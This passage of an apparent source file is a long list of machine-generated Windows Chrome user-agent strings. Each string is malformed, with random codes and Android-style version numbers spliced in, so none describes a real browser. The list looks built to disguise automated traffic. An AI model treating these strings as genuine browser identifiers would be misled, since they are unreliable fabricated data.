Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)H973Z) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4428.71 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)M308G) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4666.42 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)D682K) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4448.113 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A304S) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4699.58 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Y652C) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4421.94 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)O349G) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4520.55 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)L794C) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4647.92 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)X665H) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4780.94 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)I201D) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4536.63 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)P394P) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4324.57 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)H278C) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4769.147 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)X774F) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4388.118 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)X80N) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4464.52 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)L281E) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4466.44 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)I612P) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4526.81 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)P201L) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4320.92 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)A593D) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4811.94 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)X563I) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4212.102 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A471A) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4529.110 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)U228Y) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4364.142 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)P996R) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4483.77 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)A605G) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4631.99 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Z637A) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4653.96 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)M539B) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4852.132 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)E400T) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4257.109 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)O200H) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4518.72 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Z788X) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4316.145 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)I245P) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4505.78 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)F851C) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4395.123 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A403D) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4505.66 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)D725R) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4686.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)U479A) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4712.77 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Y368Z) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4612.67 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)P27V) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4388.146 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A350W) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4508.45 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Y830J) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4426.100 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)Q290L) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4691.107 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)K103L) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4230.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)K429J) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4350.146 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)R495Z) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4266.74 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)K46A) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4309.112 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)G464O) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4408.87 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A962N) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4408.57 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)S381A) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4206.101 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)B215E) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4822.41 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)T938S) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4356.50 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)T656F) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4883.142 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)H562X) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4862.92 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)V628G) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4217.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)I726Y) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4705.81 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)O556O) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4295.114 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)J448P) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4436.69 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)D776F) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4828.119 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)T250O) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4651.124 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)I345Z) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4442.116 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Y402R) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4296.84 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)C683R) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4633.117 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Z847M) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4288.137 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)E472V) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4710.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)W828L) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4401.132 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)B276A) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4772.141 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)C350E) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4224.81 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)I643M) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4769.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Q315A) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4672.118 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)N821B) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4603.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)A703A) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4252.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)A136W) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4796.116 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)J8U) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4690.146 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)B168Y) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4663.60 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)G200U) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4657.104 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)O391O) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4241.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)F210Y) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4707.144 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)E921F) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4606.96 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A574M) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4575.87 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)O228L) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4782.49 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)W317B) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4412.100 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)J471S) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4402.103 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A574N) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4447.101 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)T741T) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4715.97 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)V736T) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4492.132 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)M294F) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4465.82 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)L133D) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4362.145 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)K901C) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4270.117 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)A235X) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4453.74 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)R373V) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4541.142 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)T275X) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4287.85 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)O471P) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4266.96 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)H797O) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4611.118 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)J953R) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4339.93 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)X622W) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4856.126 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)W709B) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4278.108 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)X274B) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4891.46 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)A272S) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4778.148 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)H312G) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4203.47 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)O306X) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4493.74 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)I785V) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4321.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)L918W) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4586.132 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)R428I) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4490.60 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)N242N) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4474.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)F619T) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4235.128 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)S290A) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4756.63 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)J280M) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4338.98 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)H563P) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4249.55 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)G858A) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4820.83 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)K668V) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4794.106 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)V797T) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4719.110 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)W493E) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4429.112 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)L293Y) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4285.136 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)J766I) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4459.128 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)N132W) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4476.70 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)B128M) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4562.113 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)T808C) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4458.62 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)R685R) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4274.60 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)P230G) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4760.138 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)A177D) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4470.145 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)X660D) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4308.57 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)E315H) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4690.127 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)M687D) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4239.40 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Y999N) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4690.59 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)J119X) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4566.57 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)C673W) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4494.146 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)N338V) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4658.70 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)L628B) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4251.101 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)S350J) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4467.80 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A126M) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4706.75 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)A173Z) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4773.101 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)N632U) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4759.92 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)X395A) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4745.150 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)V707B) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4569.138 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)X997A) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4404.86 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)A348N) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4408.89 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)D614W) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4316.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)M342R) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4720.58 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)F99U) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4477.92 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)P416V) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4859.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)E875W) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4707.133 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)B872W) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4694.132 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)M283S) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4477.52 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Q619E) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4538.80 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Q375A) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4335.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Y725A) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4686.124 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)U514A) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4686.97 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)R779W) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4477.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)D911H) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4825.127 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)W437O) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4322.42 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)S669T) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4627.42 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)U57T) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4730.135 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)P57Z) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4485.66 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)K326E) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4726.150 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)V406R) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4801.67 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Q994V) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4850.144 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)N839R) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4363.116 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)M748L) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4211.62 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)E223K) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4655.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A545R) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4245.40 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)T852I) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4847.51 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Y81Z) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4211.116 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)I974Y) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4875.52 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)J519A) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4847.64 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)F448H) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4455.123 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)A359N) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4554.112 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)M612P) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4389.143 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; 